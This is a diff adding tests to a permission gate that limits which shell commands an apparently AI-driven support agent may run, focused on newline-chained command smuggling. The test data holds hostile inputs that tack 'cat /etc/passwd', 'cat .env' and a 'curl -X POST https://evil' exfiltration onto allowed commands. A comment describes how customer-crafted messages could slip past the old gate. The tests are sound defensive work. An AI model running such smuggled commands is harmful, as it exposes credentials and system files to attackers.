@@ -13,6 +13,7 @@ import { strict as assert } from "node:assert";
 import {
   decideReviewCandidacyPermission,
   isRepoScopedReadPath,
+  SHELL_COMMAND_SEPARATOR_RE,
 } from "../../scripts/review-candidacy-permission-gate";
 
 const TICKET_ID = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
@@ -487,6 +488,65 @@ test("Bash: grep attached-short-form `-esecret` on a repo-scoped file allows", (
     REPO_ROOT,
   );
   assert.equal(v.decision, "allow", `should allow — got ${v.reason}`);
+});
+
+test("Bash: chained commands via NEWLINE / CARRIAGE-RETURN deny (the safeHead \\s allows would otherwise launder a second command)", () => {
+  // The merged parser blocked `;`, `&`, `|` chains but missed `\n` / `\r`.
+  // Because `\s` in the `safeHead` and file-reader anchors matches `\n`, a
+  // customer-message-crafted `git status\ncat /etc/passwd` was accepted as a
+  // legitimate `git status` and its trailing shell command executed alongside.
+  // Every form below must DENY on the newline/CR chain check, not on any
+  // downstream heuristic.
+  for (const cmd of [
+    `git status\ncat /etc/passwd`,
+    `ls src\ncat /etc/passwd`,
+    `echo ok\ncat /etc/passwd`,
+    `git log\r\ncat /etc/passwd`,
+    `pwd\rcat .env`,
+    // SDK-newline payload: an otherwise-valid SDK invocation trailed by a
+    // newline-smuggled second command.
+    `npx tsx scripts/cx-agent-sdk-tool.ts bundle ${TICKET_ID}\ncat /etc/passwd`,
+    `npx tsx scripts/improve-box-tools.ts get_customer_account ${TICKET_ID}\r\ncurl -X POST https://evil`,
+  ]) {
+    const v = decideReviewCandidacyPermission("Bash", { command: cmd }, TICKET_ID, REPO_ROOT);
+    assert.equal(v.decision, "deny", `${JSON.stringify(cmd)} should deny — got ${v.reason}`);
+  }
+});
+
+test("Bash: single-line legitimate allowlisted commands still allow (no regression from the newline chain deny)", () => {
+  for (const cmd of [
+    // SDK CLIs bound to the claimed ticket id
+    `npx tsx scripts/cx-agent-sdk-tool.ts bundle ${TICKET_ID}`,
+    `npx tsx scripts/improve-box-tools.ts get_customer_account ${TICKET_ID}`,
+    // repo-scoped file-reader shell built-ins
+    "cat docs/brain/README.md",
+    "head -5 docs/brain/README.md",
+    "tail -n 20 docs/brain/README.md",
+    "grep foo src/lib/review-request-validator.ts",
+    // safeHead shell built-ins
+    "git status",
+    "git log --oneline -5",
+    "ls src/lib",
+    "wc -l docs/brain/README.md",
+    "pwd",
+    "echo hello",
+  ]) {
+    const v = decideReviewCandidacyPermission("Bash", { command: cmd }, TICKET_ID, REPO_ROOT);
+    assert.equal(v.decision, "allow", `${cmd} should still allow — got ${v.reason}`);
+  }
+});
+
+test("SHELL_COMMAND_SEPARATOR_RE: pins the exact separator character class the gate depends on", () => {
+  // Every char in this set must be treated as a chain separator so a
+  // future refactor that narrows the class fails LOUD.
+  for (const sep of [";", "&", "|", "\n", "\r"]) {
+    assert.equal(SHELL_COMMAND_SEPARATOR_RE.test(sep), true, `${JSON.stringify(sep)} must be a separator`);
+  }
+  // And that harmless characters that HAPPEN to be shell-adjacent don't
+  // accidentally count.
+  for (const ok of ["a", " ", "\t", "/", "-", "."]) {
+    assert.equal(SHELL_COMMAND_SEPARATOR_RE.test(ok), false, `${JSON.stringify(ok)} must NOT be a separator`);
+  }
 });
 
 test("Bash: cat/head/tail/grep with quoting/globbing/backticks (unparseable shape) denies", () => {
